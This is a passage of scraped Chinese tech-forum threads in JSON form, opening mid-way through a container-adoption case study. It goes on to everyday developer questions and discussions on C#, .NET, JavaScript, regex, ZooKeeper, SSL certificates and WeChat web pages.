捕获日志，这样日志文件既不需要落盘，也使日志文件摆脱了状态，可以更容易的横向扩缩。</p>\n<h4>最终选择的解决方案</h4>\n<p>最终我们实现的是方案三，因为用户在我们的建议下，选择了将日志输出到标准输出。</p>\n<h4>新的问题</h4>\n<p>写日志的目的是为了看的，这是一个无比正确的废话，但是如何实时的看到需要的日志却成了我们面临的一个新问题。在容器时代之前，我们一般是通过 tail 来实时的看日志或者通过 Kibana 来分析日志。</p>\n<p>在容器的时代，通过 Kibana 看日志的方式没什么变化，但是看实时日志就有了一些问题，在用户采取了我们的建议将日志写入标准输出后可以比较优雅的处理日志了，但是另外一个问题出现了，实时日志没有了，因为日志已经被 log-driver 收走了，怎么办？虽然依然可以从 ES 中找到日志，但是由于 ELK 本身的机制，不能通过 ELK 看到实时日志。</p>\n<h4>新的解决办法</h4>\n<p>新的问题，需要新的办法来解决，如何解决，其实说穿了也简单，实现了一个 log-agent 的功能，可以将日志送到两个地方， Logstash 和实时日志。</p>\n<h4>总结</h4>\n<p>事情就是这样，我们以为解决了一个问题的时候，往往一个新的问题又摆在前面，像容器落地这种事情，对传统应用的整体工作方式和流程都有很大的冲击，所以一定也会遇到同等规模的问题需要解决。</p>\n<h3>监控</h3>\n<p>银行对监控是非常重视的，尤其是运维部门，所以为了满足客户的需求，我们实现了：</p>\n<ul>\n<li>\n<p>平台自身监控</p>\n</li>\n<li>\n<p>宿主机监控</p>\n</li>\n<li>\n<p>中间件监控</p>\n</li>\n</ul>\n<p>监控本身是我们平台很重要的一个部分，但是在实际实施过程中发现，客户其实不是很在意做的监控页面，仪表盘等监控数据，他们自身有健全的监控平台，其实我们需要做的事情就是将我们的数据吐到他的平台上即可。</p>\n<h4>总结</h4>\n<p>世事难料，你永远不知道下一块巧克力什么味道，这个我们自身投入了很大精力和时间来实现的功能在用户那里就变成了一个对接的任务。</p>\n<h3>弹性扩缩</h3>\n<p>弹性扩缩一直是容器厂家喜欢谈的一个口号，曾经有一度我们认为基于 Docker 的特性来实行弹性扩缩是一件很容易的事情，但是后来发现，这里其实有一个大坑。</p>\n<h4>扩很容易，缩很难</h4>\n<p>弹性扩容是一件比较容易的事情，我们只要对接监控数据，然后配置一些规则，即可触发应用容器个数增加，实现扩容，但是缩容就会面临几个问题：</p>\n<ul>\n<li>\n<p>什么时候缩容？</p>\n</li>\n<li>\n<p>如何安全的缩容？</p>\n</li>\n</ul>\n<p>什么时候缩容，这个问题相对来说还不是特别麻烦，可以设定一个指标，比如 CPU ，内存， IO 等指标来触发缩容，这里只要做一些带有缓冲的规则，避免由于规则简单而导致的扩缩抖动即可。</p>\n<p>如何安全的缩容相当麻烦，缩容在本质上是要停掉一些容器的，如何判断这个容器是可以停止的，如果一个容器没有流量了，那么应该是可以被停止的，如何让一个容器的流量停止？可以通过前端负载进行控制，不往这个容器分发流量，那么前端的负载是如何判断应该如何往后端分发流量呢？这个有多重因素：</p>\n<ul>\n<li>\n<p>自身算法</p>\n</li>\n<li>\n<p>应用程序本身是有状态的，需要保持会话</p>\n</li>\n</ul>\n<p>从以上简单的分析中我们可以发现，缩容不是简单的条件符合了就可以做的事情，要想在不影响业务的情况下实现缩容，是一件非常麻烦的事情，它与平台架构，运行的程序的业务逻辑有很深的耦合。</p>\n<h4>总结</h4>\n<p>要实现自动的扩缩容，不是一件简单的事情，而是一个系统的工程。</p>\n<p>以上内容是基于数人云在某银行实施过程中总结出来的一些感悟，如果能给大家一些帮助，我们非常高兴，如果有问题，请指出来，我们共同提高， Docker 到现在大概有 3 年多的历史，个人看来它距离真正落地还有很大一段路程要走，我们必须不停的摸索。</p>\n<h3>Q&amp;A</h3>\n<p><strong>Q ：我想问一下，日志打两份的话具体是怎么实现的呢，用到了哪些技术或现有的工具呢？</strong></p>\n<blockquote>\n<p>A ：我们自己实现了一个 log-agent, 然后 log-agent 可以实现这个功能。</p>\n</blockquote>\n<p><strong>Q ：如果应用有自己的写的日志，如 log4j 的，输出不到标准输出，还怎么处理？</strong></p>\n<blockquote>\n<p>A ： log4j 貌似是可通过配置输出到标准输出的，另外如果有些应用不能输出到标准输出的，可以配置日志文件路径，我们会去读文件。</p>\n</blockquote>\n<p><strong>Q ：缩容的产生条件是否有比较好的解决方案，比如根据 CPU 、内存甚至业务规则多维度的进行考察？</strong></p>\n<blockquote>\n<p>A ：缩容很容易，但是麻烦的是如何安全的缩容，我理解这个环节其实是跟应用的逻辑有直接关系的，如果应用是一个无状态的应用，那么缩容非常简单，只需要在前端控制流量，然后停止容器即可，但是如果是有状态的应用，那么就有可能对用户造成影响。</p>\n</blockquote>\n<p><strong>Q ：配置管理这块，不断的覆盖会增加镜像体积，如何最大化减少镜像大小呢？</strong></p>\n<blockquote>\n<p>A ：首先，一个镜像最多被覆盖 2 ， 3 次，测试镜像一次，生产镜像一次，而且配置文件一般是很小的，几乎对镜像大小没有影响。</p>\n</blockquote>\n<p><strong>Q ：测试环境配置文件覆盖开发环境镜像，是只用测试环境的 docket file 吗？ 如果每天打版，会很麻烦吗？</strong></p>\n<blockquote>\n<p>A ：通过覆盖测试文件来解决环境问题，只是一个思路，不一定非要使用开发测试环境的信息，这个可以具体情况具体分析。</p>\n</blockquote>\n<p><strong>Q ： log-agent 具体实现呢，日志直接打给 log-agent 还是 log-agent 读取本地日志文件呢？或者说 log-agent 读取标准输出的内容呢？</strong></p>\n<blockquote>\n<p>A ： log-agent 可以通过 Docker 的 log-driver 获取标准输出的日志，同时也可以直接读取日志文件的日志。</p>\n</blockquote>\n<p><strong>Q ：配置 ENV 化完全可以由运维来实现，容器的启动交由脚本来执行，然后在脚本中来读取所有的 ENV 并修改应用，完成后再启动应用，这样就只需要来维护脚本了。</strong></p>\n<blockquote>\n<p>A ：是个好主意，但是我们当时考虑配置文件覆盖这个方案的时候，是基于开发人员不对代码做任何修改的思路来考虑的。</p>\n</blockquote>\n<p><strong>Q ：容器生命周期很短？如何做到动态监控？你们具体监控了哪些重要指标？谢谢。</strong></p>\n<blockquote>\n<p>A ：我们监控用的是 Prometheus 方案，监控做了 主机，容器，中间件 几个大的范围。</p>\n</blockquote>\n</div></div>"], "reply": "2", "tittle": "实践 | 一个案例思考容器落地的山高路远坑深", "comment": ["不错 不错， 有收获 ，这个软广有进步。", "搞个引导程序从配置中心下载配置，再启动业务程序不就完了。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>想建个微信群，大家可以做一些技能交换，有兴趣的可以加微信，我拉个组~ ：）\n微信： myvector</p>\n</div></div>"], "reply": "1", "tittle": "技能交换~", "comment": ["建好了发个码～"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>遇到一个需求需要用到 C#，安装好 vs 不知道如何管理项目依赖。<br>\n在网上查了下，竟然有人推荐设置好类库属性后，手动生成 dll 文件，再把 dll 文件引用到上层工程中。<br>\n肯定有什么好的方式来实现，请教大家，谢谢。</p>\n<p>类似于 Eclipse 中，直接依赖一个项目，而非拷贝 jar 包。</p>\n<hr>\n<p>右键-项目依赖项，把类库项目勾选了之后，在上层项目中using namespace报错。</p>\n</div></div>"], "reply": "7", "tittle": "vs 如何设置依赖类库，避免手动拷贝 dll 文件？", "comment": ["右键-项目依赖项，把类库项目勾选", " 谢谢回复\r", "我已经这样做了 可能是我 using namespace 写法有问题\r", "比如项目 A 依赖 项目 B 。 B 中一个 nameSpace 为 BNameSpace 。\r", "在 A 中改如何引用呢？", "我写的是 using BNameSpace;\r", "显示未能找到类型或者命名空间。", "不是应该添加引用嘛", "添加引用", " \r", " \r", "T.T 添加引用是指添加 bin 下面的 dll 文件吗？\r", "但是类库发生变动后，必须要手动先重新生成再跑上层代码吗？", "添加引用->选“项目”这一项就可以了"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>刚好有这个需求，不知道能不能实现</p>\n</div></div>"], "reply": "5", "tittle": ".net 里面要怎么做才能把数据验证做在 web api 请求之前，类似于 filter 那种效果", "comment": ["什么叫做“做在 web api 之前”？是指发送 http 请求之前？那和.net 有毛关系？\r", "\r", "如果是在 http 请求之前并且是想找微软给你集成好的数据验证，你可以看下这个  ", "编写一个继承 ActionFilterAttribute 的类，重写 OnActionExecuting ，验证数据，通过则执行 base.OnActionExecuting ，否则返回一个包含错误信息的 Response", "如果用 owin 跑 webapi 的话，可以写一个中间件 middleware ，放在 webapi 之前", "middleware"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>楼主玩过不少语言，目前主力 python 。</p>\n<p>经常因为项目需要会要写 java 和 js ，但是为什么我一直觉得 java 和 js 非常机车啊！</p>\n<p>java 脱离 IDE 根本没法写，有 IDE 也是一大坨一大坨，看的人眼睛疼， js 我尝试了三次去熟悉这个语言，每次都是玩到想哭，真的，就是想哭，为什么到处都是回调，我根本不明白整个程序的流程到底是怎么走的？</p>\n<p>谁能帮我脱离苦海？！</p>\n</div></div>"], "reply": "30", "tittle": "为什么 Java 和 js 这么机车呢？", "comment": ["你是玩不是用当然会有这种问题了，如果 python 你也不经常写，脱离了 ide 也照样没法写， 10 多年前没有什么可用 ide 的时候，还不是一直用普通的文本编辑器写 java 代码，一种语言还没熟悉没啥好评价的", "机车是什么形容词？\r", "\r", "Java 有个 ide 写的飞起，不怎么用思考，就是废话多些，内存占的大些，除此之外难道不是还挺好用？\r", "\r", "另外 JS 你初学哪来的回调啊， callback hell 是特殊场景下的情况，并不是人人都会碰到的。而且现在已经有了比较好的解决方案（ await/async ）\r", "\r", "也是主力 Python ，但我没觉得这俩语言有什么障碍。新 es 标准很好用， Java 也还不错。", "js 解决回调陷阱可以看看库 ", " 。\r", "不过 js 新版已经支持 async/await 了，写起来也很开心。", "回调哪个脚本语言没有， js 槽点不是 var ， this, undefined 和 类实现吗。每次都想吐", "机车好像是台湾骂人的话。。。", "都 2017 年了还黑回调真的是不知道说啥了。。。", "就比如这个脚本，我要在他基础上要改一个爬虫出来。\r", "\r", "\r", "\r", "逻辑也不复杂，但是就已经一堆回调了。", "因为你的主力是 Python", "机车好像就是台湾“墨迹”的意思。\r", "\r", "因为 Java 设计的目标是很多程序员可以在不熟悉对方代码的情况下协同工作，所以需要很啰嗦的语法来限定程序员能做的事情，以避免沟通上的模糊不清。\r", "\r", "我平时写 Ruby 。偶尔使用不那么熟悉的 Python 时，也会感觉 Python 挺机车的。习惯问题而已。", "js 属于乍一看很简单的，其实深似海", "话说我最近直接 Sublime 写 JAVA", " 你贴的这段代码，到处是回调？", "java 有个很牛逼的 ide 恰恰说明 java 的牛逼之处\r", "\r", "等你写大型工程的时候就知道没 ide 是多痛苦了 尤其是做代码重构的时候", "“为什么到处都是回调” 对于这个问题你有没有尝试进一步了解？你这样上来就黑，还怎么愉快地讨论啊。。\r", "你举的那个例子（#7 ）并不能代表现在的主流写法，那代码是 2012 年写的。", "java 还好 js 写起来真是不习惯", "Java 确实太过罗嗦了，试试 Kotlin 吧，一种完全兼容 Java 的不罗嗦的 Java 方言", "这是 java 被工业界广泛应用的原因之一", "java 这么多类库和 api ，没有提示根本没法写", "。又不是写算法或者 hello world 这样的程序。", "不知道你们说的 Java 啰嗦具体指什么", "多读书，这种理由我打 python 可以有一万个 先说一个，缩进。", "因为你用的是 xxx.min.js 啊，去掉了空格当然看不了", " 粗略数了一下，这贴的 gist 里面有至少 8 个回调- -", "然而我好像最喜欢这两个语言~", "你需要多了解一些语言的特性，简单来说，你对 JavaScript 的问题在于，你对这门语言不够了解。\r", "JavaScript 的独特的地方就是它单线程异步的特性，这个不了解的话，不能说 JavaScript 入门了吧", " 说的对\r", "楼主你压根还没入门", "特意去查了一下机车是什么意思。。。", "感觉 Python 就是胶水语言，后端不如 java, 只能调 c++ 库，前端只能用 js 啊", " 异步感觉几乎是用 JS 必然遇到的 😂", "不如试试 typescript 吧", "无 callback 不 js 。这个是必须的了，不然人家单线程， server side （ nodejs ）怎么可以那么高的吞吐， client side （ browser ）怎么可以处理那么多的 event （ timeout ， xhr ， click ， hover ， scroll etc...）\r", "Java 嘛，没什么好说的，用惯了 intellij 效率是非常高的，尤其大项目！"]},
{"content": ["<div class=\"topic_content\">如题\r<br>\r<br>搜了一圈,没有合适的答案</div>"], "reply": "2", "tittle": "zookeeper 的脑裂怎么处理?", "comment": ["裂成 2 个集群了，数据已经不同了， zk 内的数据修复不成之前的样子，要用外部方案来重新恢复集群的工作", "集群的配置一般是 3 台或者 5 台，怎么会出现脑裂呢？"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>写下这篇文章的缘由是因为在项目过程中，碰到了一个使用 JavaScript 处理 UINT64 类型数字的坑，不知道在座的各位是否跟我一样经常被踩坑，随我一起聊聊踩坑史吧。</p>\n<p><a href=\"https://www.qcloud.com/community/article/626781001489391644?fromSource=gwzcw.92746.92746.92746\" rel=\"nofollow\">踩坑记：当 JavaScript 遇上 UINT64</a></p>\n<p>欢迎大家前来回复，一起探讨...</p>\n</div></div>"], "reply": "8", "tittle": "踩坑记：当 JavaScript 遇上 UINT64", "comment": ["你是机器人吗", "楼上不要这样，楼主就安安静静发个文章而已", "这就是该我们 c/c++程序员得瑟的时候了：这种坑我们一脚下去能给踩实了。", "我们用 pb 也有这个问题， 不过让后端来处理了， int64 转成 string 了", " 可以可以\r", " 你是说 pbc 吧？ pb 没这问题啊。 pbc 也只是 lua 5.1 的 lua binding 有这问题。那是 lua 的问题不是 pbc 的问题呀", "原来还有这种坑..", "是在讨论浮点误差啊.", "c 飘过"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>I love MySQL-Front. I love it to develop it. I love it to find out what the users needs and what not. I love it to detect, analyze and fix bugs. And I love it to support individual questions and wishes.\nDaily, MySQL-Front will be downloaded more than 500 times - so there are some guys, who loves my work and the result of it too.\nBut to offer MySQL-Front, I need a internet connection - and currently, I don't have a internet connection at home. I have to ride my bike for 8 km to get an open internet connection to update MySQL-Front or to receive mails and bug reports.\nI had more and more trouble with my own internet connection. The \"service people\" became more and more ignorant and rudely. So I dropped that connection. Now, I would like to have a new ISP, but I have to accept more and more pressurings, controls and the technical solutions doesn't work well for me. Additional, I should pay my money for that.\nWhy? Why should I do this? What could be a motivation for me, to pay my money to offer work to other people? Why should I accept bad contracts to support other people? Why should I do my work, if I don't have the tools to do this job well?\nI don't ask for money for MySQL-Front, since I don't like the egoism games of money, contracts and rules. I simple offer what I can do and I share what I have. If other people would support my kind of living I would have an internet connection and other things, I need to publish this software. But I don't have it.\nSo, why should I offer MySQL-Front further more? Why... ?</p>\n<p>Nils</p>\n<p>PS\nPlease don't offer money to me. I don't like the games of money, contracts and rules - and I don't accept them as a base for our live.</p>\n<p>链接： <a href=\"http://www.mysqlfront.de/why.html\" rel=\"nofollow\">http://www.mysqlfront.de/why.html</a></p>\n<p>github ： <a href=\"https://github.com/NilsHoyer/MySQL-Front/issues/28\" rel=\"nofollow\">https://github.com/NilsHoyer/MySQL-Front/issues/28</a></p>\n<p>莫名感觉有点心酸，作者到底是何许人也，问什么要骑自行车 8 公里才能上网？莫非作者过得很拮据？</p>\n</div></div>"], "reply": "14", "tittle": "今天更新 MySQL-Front，作者说了一些事", "comment": ["感谢各位无私奉献的开发者", "业界良心啊！", "有捐赠链接嘛？", " 作者说了不要钱 :P", " 原作者说不要钱。。。", "国安局工作的", "抑郁症倾向", "或许他需要一个女朋友", "别人有低保吧", "or maybe he needs a gf😏", "估计是抑郁了", "理想主义者", "与我朝人民价值观的巨大反差啊、、", " 是的"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>不了解正则，这个问题在网上可以搜到很多答案，但是答案之间差异很大，好像各种编程语言实现的方式都不一样？难道正则表达式在不同编程语言里会有差异？学着正则的教程弄了半天，总是会把一头一尾两个字符给匹配到，请问有没有以下一句正则表达式：</p>\n<ol>\n<li>能匹配某两个任意字符之间的所有内容但不包含该字符？</li>\n<li>在任何编程语言都通用，实现方法可以不同。</li>\n<li>尽量多匹配。</li>\n<li>所有内容可以不包含换行符。</li>\n<li>如果把任意字符换成任意多个字符呢？例如 <strong>([{'要匹配的内容\"/\\&gt;([{'要匹配的内容\"/\\&gt;([{'要匹配的内容\"/\\&gt;</strong> ，如何让编程语言通过一条正则表达式返回类似 “要匹配的内容要匹配的内容要匹配的内容” 的字符串呢？</li>\n</ol>\n<p>谢谢。</p>\n</div></div>"], "reply": "17", "tittle": "有没有一句通用的正则表达式，能匹配某两个任意字符之间的所有内容但不包含该字符？", "comment": ["/(?<=X).*(?=Y)/", "两个任意字符是给定的吗？需要匹配多次吗？需要匹配 ABxxAByyyAB 里面的 xx 和 yyy 吗？", "(?<=x)(.+)(?=y)", "> 难道正则表达式在不同编程语言里会有差异\r", "\r", "是的。不同的正则引擎实现是有差异的。小的话只是语法不一样，大的话功能特性效率都会大有差别。", "可能要注意 greedy vs lazy, ", " 给定，需要，最后一句不清楚，我问题里面的例子有不清楚的地方吗？", " 哦，原来是这样，我主要用 Python 和 Javascript ，做笔记时要好好区分下了。", " 嗯，我应该是要 greedy 的。", "Python 为例：\r", "\r", ">>> import re\r", ">>> pattern = r'''(?<=\\(\\[\\{').+?(?=\"/\\\\>)'''\r", ">>> string = '''([{'aabbcc\"/\\>([{'aabbcc\"/\\>([{'aabbcc\"/\\>'''\r", ">>> re.findall(pattern, string)\r", "输出：\r", "['aabbcc', 'aabbcc', 'aabbcc']\r", "\r", "获取到内容后，剩下的可以自由发挥了。", "有些语言没有逆序环视的..", "单个字符： a([^ab]+)b\r", "字符串：\r", "本站搜索 正则 排除，带上我的 nick 搜，回复过很多次了", "单字符：  a([^a]+)*a\r", "多字符好像没有跨语言的方法。有些语言 /库的正则可以排除，那得看文档了", "我感觉第三条  尽量多匹配会导致你出错， greedy 。\r", "正则前段为匹配开始， 中间要排除非尾巴的字符并且列为元组 ，如果中间是 greedy 的话，会尽可能多的匹配，直到最后一个匹配项的结束,就是你每次都匹配到结尾而且只有一个的原因，如果是 lazy 的话，会只匹配最低限度。\r", "我没有用到过一句正则执行就返回一个你所说的字符串的，难道不是应该用匹配对象中的匹配值进行拼接吗？就是拼接中间的匹配到的元组。", " 感觉你需要的不是匹配中间的东西，而是剔除给定的字符。", "通用的是没有的。各语言的正则实现都不一样，连通配符都可能不一样，没法通用。", "Xxx(.*?)xxX", "匹配两个字符之间的任意字符...那怎么判断开始和结束的字符呢.."]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><em>前段时间苹果爸爸上架了新的亲儿子应用： Clips ，没用过的同学可以下一个试试。但系统要求至少 10.3</em></p>\n<p>想试着实现里面的“漫画书”和“墨水”滤镜，但在滤镜算法这方面没有神马研究（就只会调 API ，做一些微小的工作）\n所以问问看聚聚们有没有什么实现的思路(主要应该就是 Shader 怎么写)</p>\n<p>顺带问一句。。这里是不是不能上传图片啊，没找到上传的入口= =（ ps,我知道 Markdown 的<code>![]()</code>）</p>\n<p>感觉，“墨水”滤镜用到的算法有点像是：Sobel边界检测</p>\n</div></div>"], "reply": "1", "tittle": "对于 Apple 新出的 iOS 应用 Clips 中的滤镜实现各位有啥思路吗", "comment": ["发图的方法在 FAQ 里面有写，格式不复杂的话不推荐用 Markdown 的图片语法"]},
{"content": ["<div class=\"topic_content\">如图\r<br><a target=\"_blank\" href=\"https://ooo.0o0.ooo/2017/04/12/58ee332d62743.png\" rel=\"nofollow\">https://ooo.0o0.ooo/2017/04/12/58ee332d62743.png</a>\r<br>\r<br>感恩！</div>"], "reply": "9", "tittle": "各位大佬帮忙看下这是那种字体？", "comment": ["上面那两个网站根本没有这个字体。\r", "\r", "经本人考证，这款字体的名字叫 ANURATI-REGULAR 。", "三位都是神人。 收获一波素材！", " 萬分感謝！就是這個！", " \r", "\r", "\r", "\r", "这个是字体重叠了嘛？还是间距问题", " 字间距的问题", " 纠正一下，不是间距问题，这字体就是这样设计的。", "anurati-font\r"]},
{"content": ["<div class=\"topic_content\"><a target=\"_blank\" href=\"https://www.mengmeitong.com/\" rel=\"nofollow\">https://www.mengmeitong.com/</a></div>"], "reply": "22", "tittle": "在阿里云买了个域名很快就申请下 ssl 证书了, 别的地方买的就很长时间通不过验证", "comment": ["腾讯云的过的很快", " \r", "\r", "空间是腾讯云的，免费体验服务器，因为要玩小程序，所以试了下腾讯云。", "已经连上 websocket 服务器了, 可以玩聊天室了\r", "\r", "我用的阿里云 ,并没有用 cdn.目前内容还很少，不过速度也是杠杠的", "sendtext cn", "论 ssl 的签发速度，百度第一，但不能下载。百度 cdn 部署速度第一，阿里稍弱，腾讯最慢。", " cloudflare is 表示不服", "七牛签发也很快啊，我上次签了一个，十分钟左右", " 七牛的没法下载", " #9 复制就可以。", " cf 的不能算，他那个是自有证书二次签", " 付费 5 美元每月，可得到独立证书。", " 呵呵，楼主明显要的是免费的", "我申请了好几个阿里云的免费证书，域名都是在别处购买的，都是很快就审核下来了\r", "当然，我用了阿里云的 ECS 。\r", "如果什么付费的都没有用，那就不清楚了", "备案麻烦吗？", "阿里云有免费证书？ 在哪申请啊", " ", " 我就属于什么都没付费的，然后就一直等，我确定我没有配置错。后来在阿里云买了个域名，去申请证书，几分钟就下来了。", "现在免费证书一大堆，感觉都不麻烦呢，很快搞定", " 对，可以复制下来的。\r", "看我博客：<http://blog.cellmean.com/七牛云的免费 ssl 证书申请和用法>", " 我就单单申请证书,也可以申请的,我阿里的其他产品都没有购买", "腾讯云啊，也很快。阿里云的服务太差了。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>只有闯关成功才有参与资格，高额税后奖金等你拿！</p>\n<p>闯关链接： <a href=\"http://t.cn/R61x4ae\" rel=\"nofollow\">http://t.cn/R61x4ae</a></p>\n<hr>\n<p><strong>活动描述</strong></p>\n<ol>\n<li>\n<p>活动时间： 4 月 6 日-4 月 24 日</p>\n</li>\n<li>\n<p>比赛内容：设计一套代码闯关题：即，在每一页代码中设置隐藏通往下一页面的线索，并逐渐增加难度。共计五到十关即可。</p>\n</li>\n<li>\n<p>参与方式：用户在云沃客项目详情页接单，接单同时提交自己的参赛作品。</p>\n</li>\n<li>\n<p>评审环节：参与者提交作品及答案，由技术同学进行评审。代码提交时，不能以加密方式提交。</p>\n</li>\n<li>\n<p>公布获奖名单：在公众号公布并收集联系方式</p>\n</li>\n<li>\n<p>本活动结束后，获奖作品将署名作者，为云沃客使用。</p>\n</li>\n<li>\n<p>注意：您提交了参赛作品后，我们会进行评审，评审后分出前三名，分别获得奖项：税后奖金：一等奖 6000 ，二等奖 5000 ，三等奖 4000 ，我们将以奖金形式发放。奖金与项目酬劳不叠加。</p>\n</li>\n<li>\n<p>审核标准：关数是否符合标准；难度是否从易-难；提交要求是否符合提交要求；是否有创意等。</p>\n</li>\n<li>\n<p>粗制滥造者不予以通过审核。</p>\n</li>\n</ol>\n</div></div>"], "reply": "12", "tittle": "[云沃客] 代码密室逃脱游戏设计比赛（ web 开发）", "comment": ["睡觉去了.", " 晚安", "一楼正解", "看下", " 已经不能好好玩耍了，哈哈", "nice", "之前 v2 也有发过几个通关网站，挺有意思的", "欢迎大家参与", "通关了，不好玩。\r", "\r", "你光说颜色谁知道是中文英文啊。我试了白天各种大小写，最后发现是中文。", "中文， MD5 ，呵呵呵", "需求方最近的活动\r", "\r", "最后查看： 2017-04-12 11:06\r", "报名人数： 1\r", "已雇人数： 0"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>在线教育市场千亿规模的今天，用户数量几何级爆发，对互联网在线教育产品的稳定性和用户体验提出了更高的要求，性能测试作为保证产品质量的重要一环显得尤为重要。</p>\n<p>本期性能测试专题特邀三好网、吆喝科技、 OneAPM 等行业内专家与大家分享产品上线前全链路性能测试的经验与心得。</p>\n<h2>分享嘉宾</h2>\n<p><img alt=\"\" src=\"https://i.v2ex.co/XSr7iLR8.png\">\n<img alt=\"\" src=\"https://i.v2ex.co/68kWS24x.png\">\n<img alt=\"\" src=\"https://i.v2ex.co/8vMKYHKR.png\"></p>\n<h2>课程安排</h2>\n<p><img alt=\"\" src=\"https://i.v2ex.co/M4i63xTU.png\"></p>\n<p>主题：技术公开课 | 全链路性能测试在线教育行业专场</p>\n<p>时间： 2017.4.14 （ 周五 ） 13:30-16:30</p>\n<p>方式：线下会议，报名链接： <a href=\"http://cn.mikecrm.com/5eygrN2\" rel=\"nofollow\">http://cn.mikecrm.com/5eygrN2</a></p>\n<p>地点：中关村互联网教育创新中心 9 层多功能厅（ 抵达中关村科技贸易中心后，从 B 座的旋转门进入 1 层大厅，然后乘坐电梯到达 9 层多功能厅。）</p>\n<h2>互动&amp;报名有礼</h2>\n<p>互动环节，精美礼品大派送！报名即送定制版超大加厚高端鼠标垫（凭回执短信领取）。\n<img alt=\"\" src=\"https://i.v2ex.co/51r6yxlH.png\"></p>\n<h2>报名链接： <a href=\"http://cn.mikecrm.com/5eygrN2\" rel=\"nofollow\">http://cn.mikecrm.com/5eygrN2</a></h2>\n</div></div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><p>重新传下图片</p>\n<p><img alt=\"\" src=\"https://i.v2ex.co/c90mh4Wo.png\"></p>\n</div></div>"], "reply": "5", "tittle": "线下沙龙 | 全链路压测技术秘籍分享", "comment": ["支持", "这个图片内容好喜感……", "我们读得书少，有些字看不懂，但你也别骗我。\r", "算法烂没关系，给钱加服务器咯\r", "以前是语音转文字的。我不识字嘛。", "小米车载净化器的配图是小米充电宝\r", "小米充电宝的配图是看起来像一个音响的小米车载净化器", " 是的，文字排错了，重做了一张"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>本来我是放弃 CSDN 很多年的，同事说要借我账号下载一个文件，还有很多积分没有用完。</p>\n<p>登录需要用户进行手机号验证，验证就验证吧，这家伙居然要用户发送上行短信验证，倒不是缺这 1 毛 2 毛钱，这样直接把成本嫁接给用户真的好吗？</p>\n<p><img alt=\"\" src=\"http://i4.buimg.com/567571/dedfd206d33aa7ea.png\"></p>\n<p>只能暗想 CSDN 某位产品经理真是吃了翔！</p>\n</div></div>"], "reply": "109", "tittle": "CSDN 某位产品经理是吃了翔吗？", "comment": ["已经找回，毕竟用到是免费的服务~~", "QQ 也是这么干的", "黄易也是这么干的", "获取回复的短信小商家也是要收费的，（不知道他们用的服务了）\r", "而且这种可以过滤掉一些小号和薅羊毛的\r", "当然他们是不是这么考虑的就不清楚了。\r", "虽然讨厌 csdn （未加密密码泄露受害者） 但以上是我的想法。", "好久以前登录的, 听你这么说不敢折腾了.", " 现在新的微信账号已经不能用 qq 号注册了，必须手机号。手机号注册后可以换回 qq 号，应该是实名制的原因。", " 怎么切换回来？原手机号不能解绑啊", "互联网实名制在天朝很奇怪么，手机验证肯定是必须的，取消主动发送验证短信应该是防止短信轰炸吧，短信轰炸不就是利用这些验证短信进行轰炸么", "最近统统手机验证了  gcd 的锅"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>网上找了下，对 http2 和 quic 协议讲解的多，但是还没有中文源码分析，最近打算研究下 nghttp2 库，发现可读性完全没法和 nginx 比，所以想请兄弟们一起加入进来分析注释源码。</p>\n<p>我已经收集到部分资料，在 github 上建了个 git 仓库，地址如下:\n<a href=\"https://github.com/y123456yz/reading-and-annotate-nghttp2\" rel=\"nofollow\">https://github.com/y123456yz/reading-and-annotate-nghttp2</a></p>\n<p>有兴趣的可以加入进来。</p>\n</div></div>"], "reply": "1", "tittle": "有对 http2 或者 quic 感兴趣的吗？一起来分析开源 http2 c/c++库 nghttp2 和谷歌的 quic 协议源码", "comment": ["我已经注释了部分代码，有加入进来的没，一起分模块来分析源码。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>在微信内浏览可以用 navigator.userAgent.toLowerCase()来判断是否是微信内浏览器，但进阶的判断是否在微信公众号服务号如何判断，我看了微信接口也没发现有相关的判断，求高手解惑</p>\n</div></div>"], "reply": "21", "tittle": "做微信内置网页，有个疑问求高手解答", "comment": ["走一次网页授权，能过的必定在微信内了。", "如果只是判断在微信，引入 js sdk 也可以的呀。", " 判断微信内肯定可以 但判断是否在公众号服务号就不行了 我想知道他是在公众号服务号中打开网页 也就是说微信内包含了公众号服务号 也包括了微信分享出去连接打开网页 要区分开", "你是指通过服务号菜单点开的吧，微信没有这样的验证；只能说你自己给菜单加个验证参数，后台处理掉，如果分享出去的就没有这个参数这样咯。", "两种思路， 1 ，我记得可以拿到用户是否关注了你的公众号。 2 ，公众号链接带尾巴，页面 js replaceState 把尾巴去掉，这样分享的不带尾巴", "可以的, 用户点击了之后就可以获取用户的基本信息了，包括是否关注了公众号。", " 想过这么做，带尾巴点进去第一跳可以记录是微信公众号，第二跳就不行了，尾巴会消失，但如果根据尾巴记录 cookie 也不行， cookie 会一直跟着用户本地，这样也无法再判断是非公众号打开网页了，带不带尾巴，记不记 cookie 都不行，除非微信内部接口可以直接判断", "为什么会有这种需求呢，直接说说这个需求的目的吧", "网页显示在微信内置浏览器中，没有\"是否\"在公众号内的概念。\r", "\r", "要不你带两种尾巴，公众号内的一种，其他的另一种，碰到尾巴就更新 cookie,然后始终从 cookie 判断", "微信分享的链接后面会自动带一个?from={xxx}&isappinstalled={xxx}\r", "\r", "比如 ?from=singlemessage&isappinstalled=0\r", "\r", "公众号直接点击应该不带？", " #7 那你可以一直带尾巴，然后调用 jssdk 让分享地址跟当前不一样。", " 计算微信公众号和微信内分享链接的注册量，打开的链接并不是注册页，需要跳转后才到注册页，就是这个需求", " 这个是最后没办法的办法，尽可能不想带那么多尾巴，因为微信分享已经带了尾巴，继续增加逻辑会乱，当然并不是不可行", "这个不是可以统计微信按钮的点击事件吗", " 第二跳也可以啊，改程序里 url 透传", " 改 url 会有问题，当跳转一个地址以后，再返回之前页面需要 2 次，一次是之前页面的 url 